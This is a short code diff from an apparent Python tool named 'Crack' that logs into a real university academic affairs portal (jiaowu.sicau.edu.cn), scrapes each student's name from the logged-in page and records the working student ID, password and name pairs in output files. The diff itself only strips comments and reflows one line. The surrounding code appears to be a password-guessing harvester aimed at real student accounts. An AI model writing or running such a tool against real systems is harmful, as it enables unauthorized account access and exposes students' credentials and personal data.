@@ -27,14 +27,13 @@ class Crack:
                 post_url = 'http://jiaowu.sicau.edu.cn/jiaoshi/bangong/check.asp'
                 try:
                     self.session.post(post_url, data=data, timeout=5)
-                    data = self.session.get('http://jiaowu.sicau.edu.cn/xuesheng/bangong/main/index1.asp',
-                                            timeout=5)  # 跳转到个人主页
+                    data = self.session.get('http://jiaowu.sicau.edu.cn/xuesheng/bangong/main/index1.asp', timeout=5)
                 except:
                     print(student_id, 'Connection_timed_out_2', t, file=log)
                     print(student_id, file=time_out)
                     print(student_id, 'Connection_timed_out_2')
                 data.encoding = 'gb2312'
-                name = re.compile('<td width="99" align="left">(.*)</td>').findall(data.text)  # 正则匹配你的名字
+                name = re.compile('<td width="99" align="left">(.*)</td>').findall(data.text)
                 print(student_id, password, name[1], file=user_pwd)
                 print(student_id, password, name[1], t, file=log)
                 print(student_id, password, name[1], t)
